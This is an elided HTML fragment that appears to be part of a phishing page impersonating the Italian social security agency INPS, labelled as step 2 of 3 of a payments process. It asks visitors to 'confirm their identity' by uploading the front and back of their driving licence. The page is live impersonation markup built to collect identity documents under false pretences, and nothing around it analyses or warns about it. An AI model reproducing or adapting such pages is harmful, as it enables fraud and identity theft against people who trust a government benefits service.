...
<br>
    <p style="TEXT-ALIGN: CENTER;">INPS EROGAZIONI - FASE 2 DI 3</p>
<div class="progress">
  <div class="progress-bar" role="progressbar" 
  style="width: 75%" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100"></div>
</div>
...
<h3 style="font-size: 96%;margin-top: 0px;">per confermare la sua identità compili i dati richiesti</h3>
   ...
   <br><h3 class="sopra">Fronte Patente</h3>
    <input autocomplete="off" required="" class="i1" type="file" name="PATF">    
        
        <h3 class="sopra2">Assicurati che tutti gli angoli appaiono nella foto e che tutti i dati sul documento siano ben leggibili.</h3><br><br><h3 class="sopra">Retro Patente</h3>
        <input autocomplete="off" required="" class="i1 input2" type="file" name="PATR"> 
